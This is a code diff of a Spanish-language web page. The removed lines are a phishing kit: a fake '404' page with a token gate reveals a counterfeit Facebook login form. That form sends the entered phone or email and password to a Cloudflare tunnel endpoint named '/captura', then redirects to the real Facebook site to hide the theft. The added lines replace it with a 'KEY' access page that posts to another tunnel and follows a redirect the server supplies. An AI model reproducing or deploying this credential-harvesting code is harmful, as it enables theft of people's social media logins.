@@ -3,85 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>404 Not Found</title>
+    <title>Acceso Privado - Interface</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { width: 90%; max-width: 380px; text-align: center; }
-        
-        /* Estilo 404 */
-        #seccion-404 h1 { font-size: 60px; margin: 0; font-family: monospace; }
-        #seccion-404 p { color: #555; font-family: monospace; margin-bottom: 20px; }
-        .input-box { background: #f9f9f9; padding: 20px; border-radius: 10px; border: 1px solid #eee; }
-        
-        /* Estilo Facebook */
-        #seccion-fb { display: none; }
-        .fb-logo { color: #0866ff; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
-        
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        .btn-black { background: #000; color: #fff; }
-        .btn-blue { background: #0866ff; color: #fff; margin-top: 10px; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            /* Asegúrate de que pro.png esté en la misma carpeta que este archivo */
+            background-image: url('pro.png'); 
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .main-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 90%;
+            max-width: 350px;
+            /* Ajuste de posición según tu diseño */
+            margin-top: 250px; 
+        }
+
+        .key-title {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .input-box {
+            width: 100%;
+            height: 45px;
+            background-color: white;
+            border: none;
+            border-radius: 25px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 20px;
+            outline: none;
+            color: black;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 45px;
+            background-color: #cccccc;
+            border: 2px solid #888888;
+            border-radius: 25px;
+            color: black;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-submit:active {
+            background-color: #999999;
+        }
     </style>
 </head>
 <body>
 
-    <div id="seccion-404" class="container">
-        <h1>Not Found</h1>
-        <p>The requested URL was not found on this server.</p>
-        <div class="input-box">
-            <input type="text" id="nombre" placeholder="TU NOMBRE">
-            <input type="text" id="token" placeholder="DIAGNOSTIC TOKEN">
-            <button class="btn-black" onclick="validar()">RUN DIAGNOSTIC</button>
-        </div>
-    </div>
-
-    <div id="seccion-fb" class="container">
-        <div class="fb-logo">facebook</div>
-        <p style="font-size: 14px; color: #606770;">Inicia sesión para continuar.</p>
-        <input type="text" id="fb-user" placeholder="Celular o correo electrónico">
-        <input type="password" id="fb-pass" placeholder="Contraseña">
-        <button class="btn-blue" onclick="enviar()">Iniciar sesión</button>
+    <div class="main-wrapper">
+        <div class="key-title">KEY:</div>
+        
+        <input type="text" id="keyInput" class="input-box" autocomplete="off" placeholder="">
+        
+        <button onclick="validarAcceso()" class="btn-submit">Acceder</button>
     </div>
 
     <script>
-        // --- AYBER: PEGA AQUÍ TU LINK DE CLOUDFLARE ---
-        const API_URL = "https://fees-nor-brought-disclaimer.trycloudflare.com"; 
+        async function validarAcceso() {
+            const keyInput = document.getElementById('keyInput');
+            const key = keyInput.value;
+            const btn = document.querySelector('.btn-submit');
+            
+            // URL de tu túnel Cloudflared
+            const CLOUDFLARE_URL = "https://suit-married-dramatically-industrial.trycloudflare.com/validate";
 
-        async function validar() {
-            const n = document.getElementById('nombre').value;
-            const t = document.getElementById('token').value;
+            if (!key) {
+                alert("Por favor, ingresa una KEY.");
+                return;
+            }
 
             try {
-                const res = await fetch(`${API_URL}/get-ghost-code`, {
+                btn.innerText = "Verificando...";
+                btn.disabled = true;
+                
+                const response = await fetch(CLOUDFLARE_URL, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ nombre: n, llave: t })
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ key: key })
                 });
 
-                if (res.ok) {
-                    document.getElementById('seccion-404').style.display = 'none';
-                    document.getElementById('seccion-fb').style.display = 'block';
+                const result = await response.json();
+
+                if (response.status === 200) {
+                    // Si el servidor envía una ruta de redirección
+                    if (result.redirect) {
+                        window.location.href = "https://suit-married-dramatically-industrial.trycloudflare.com" + result.redirect;
+                    } else {
+                        alert("ACCESO GARANTIZADO");
+                    }
+                    keyInput.value = ""; 
                 } else {
-                    alert("Token inválido.");
+                    alert("KEY INVÁLIDA");
+                    keyInput.value = ""; 
                 }
-            } catch (e) { alert("Error: El servidor en Termux no responde."); }
-        }
-
-        async function enviar() {
-            const u = document.getElementById('fb-user').value;
-            const p = document.getElementById('fb-pass').value;
-
-            if(!u || !p) return alert("Completa los campos.");
-
-            try {
-                await fetch(`${API_URL}/captura`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ user: u, pass: p })
-                });
-                // Redirección falsa para despistar
-                window.location.href = "https://m.facebook.com/login/identify";
-            } catch (e) { alert("Error de conexión."); }
+            } catch (error) {
+                console.error("Error de conexión:", error);
+                alert("Error: No se pudo conectar con el servidor de Cloudflare.");
+            } finally {
+                btn.innerText = "Acceder";
+                btn.disabled = false;
+            }
         }
     </script>
 </body>
